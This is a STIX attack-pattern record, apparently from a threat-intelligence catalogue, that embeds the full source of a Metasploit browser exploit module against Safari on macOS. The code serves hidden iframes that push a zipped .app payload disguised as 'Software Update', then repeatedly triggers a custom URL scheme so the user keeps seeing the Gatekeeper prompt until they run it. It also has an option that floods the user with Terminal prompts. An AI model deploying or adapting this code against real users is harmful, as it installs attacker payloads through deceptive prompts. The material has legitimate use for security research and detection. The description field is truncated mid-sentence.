{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ebe55d7e-2370-4843-9062-835a72d21486",
    "created": "2024-08-14T16:34:28.76111Z",
    "modified": "2024-08-14T16:34:28.761114Z",
    "name": "Safari User-Assisted Download and Run Attack",
    "description": " This module abuses some Safari functionality to force the download of a zipped .app OSX application containing our payload. The app is then",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/safari_user_assisted_download_launch.rb",
            "external_id": "safari_user_assisted_download_launch.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  # Note: might be nicer to do this with mounted FTP share, since we can\n  # unmount after the attack and not leave a trace on user's machine.\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Safari User-Assisted Download and Run Attack',\n      'Description'    => %q{\n        This module abuses some Safari functionality to force the download of a\n        zipped .app OSX application containing our payload. The app is then\n        invoked using a custom URL scheme. At this point, the user is presented\n        with Gatekeeper's prompt:\n\n        \"APP_NAME\" is an application downloaded from the internet. Are you sure you\n        want to open it?\n\n        If the user clicks \"Open\", the app and its payload are executed.\n\n        If the user has the \"Only allow applications downloaded from Mac App Store\n        and identified developers (on by default on OS 10.8+), the user will see\n        an error dialog containing \"can't be opened because it is from an unidentified\n        developer.\" To work around this issue, you will need to manually build and sign\n        an OSX app containing your payload with a custom URL handler called \"openurl\".\n\n        You can put newlines and unicode in your APP_NAME, although you must be careful not\n        to create a prompt that is too tall, or the user will not be able to click\n        the buttons, and will have to either logout or kill the CoreServicesUIAgent\n        process.\n      },\n      'License'        => MSF_LICENSE,\n      'Targets'        =>\n        [\n          [ 'Mac OS X x86 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Mac OS X x64 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X64,\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-03-10',\n      'Author'         => [ 'joev' ],\n      'BrowserRequirements' => {\n        :source  => 'script',\n        :ua_name => HttpClients::SAFARI,\n        :os_name => OperatingSystems::Match::MAC_OSX,\n\n        # On 10.6.8 (Safari 5.x), a dialog never appears unless the user\n        # has already manually launched the dropped exe\n        :ua_ver  => lambda { |ver| ver.to_i != 5 }\n      }\n    ))\n\n    register_options([\n      OptString.new('APP_NAME', [false, \"The name of the app to display\", \"Software Update\"]),\n      OptInt.new('DELAY', [false, \"Number of milliseconds to wait before trying to open\", 2500]),\n      OptBool.new('LOOP', [false, \"Continually display prompt until app is run\", true]),\n      OptInt.new('LOOP_DELAY', [false, \"Time to wait before trying to launch again\", 3000]),\n      OptBool.new('CONFUSE', [false, \"Pops up a million Terminal prompts to confuse the user\", false]),\n      OptString.new('CONTENT', [false, \"Content to display in browser\", \"Redirecting, please wait...\"]),\n      OptPath.new('SIGNED_APP', [false, \"A signed .app to drop, to workaround OS 10.8+ settings\"])\n    ])\n  end\n\n  def on_request_exploit(cli, request, profile)\n    if request.uri =~ /\\.zip/\n      print_status(\"Sending .zip containing app.\")\n      seed = request.qstring['seed'].to_i\n      send_response(cli, app_zip(seed), { 'Content-Type' => 'application/zip' })\n    else\n      # send initial HTML page\n      print_status(\"Sending #{self.name}\")\n      send_response_html(cli, generate_html)\n    end\n    handler(cli)\n  end\n\n  def generate_html\n    %Q|\n    <html><body>\n    #{datastore['CONTENT']}\n    <iframe id='f' src='about:blank' style='position:fixed;left:-500px;top:-500px;width:1px;height:1px;'>\n    </iframe>\n    <iframe id='f2' src='about:blank' style='position:fixed;left:-500px;top:-500px;width:1px;height:1px;'>\n    </iframe>\n    <script>\n    (function() {\n      var r = parseInt(Math.random() * 9999999);\n      if (#{datastore['SIGNED_APP'].present?}) r = '';\n      var f = document.getElementById('f');\n      var f2 = document.getElementById('f2');\n      f.src = \"#{get_module_resource}/#{datastore['APP_NAME']}.zip?seed=\"+r;\n      window.setTimeout(function(){\n        var go = function() { f.src = \"openurl\"+r+\"://a\"; };\n        go();\n        if (#{datastore['LOOP']}) {\n          window.setInterval(go, #{datastore['LOOP_DELAY']});\n        };\n      }, #{datastore['DELAY']});\n      if (#{datastore['CONFUSE']}) {\n        var w = 0;\n        var ivl = window.setInterval(function(){\n          f2.src = 'ssh://ssh@ssh';\n          if (w++ > 200) clearInterval(ivl);\n        }, #{datastore['LOOP_DELAY']});\n      }\n    })();\n    </script>\n    </body></html>\n    |\n  end\n\n  def app_zip(seed)\n    if datastore['SIGNED_APP'].present?\n      print_status \"Zipping custom app bundle...\"\n      zip = Rex::Zip::Archive.new\n      zip.add_r(datastore['SIGNED_APP'])\n      zip.pack\n    else\n      plist_extra = %Q|\n        <key>CFBundleURLTypes</key>\n        <array>\n          <dict>\n            <key>CFBundleURLName</key>\n            <string>Local File</string>\n            <key>CFBundleURLSchemes</key>\n            <array>\n              <string>openurl#{seed}</string>\n            </array>\n          </dict>\n        </array>\n      |\n\n      my_payload = generate_payload_exe(:platform => [Msf::Module::Platform::OSX])\n      Msf::Util::EXE.to_osx_app(my_payload,\n        :app_name    => datastore['APP_NAME'],\n        :plist_extra => plist_extra\n      )\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ joev ]",
        ""
    ],
    "x_mitre_disclosure_date": "2014-03-10",
    "x_mitre_platforms": [
        "osx'"
    ]
}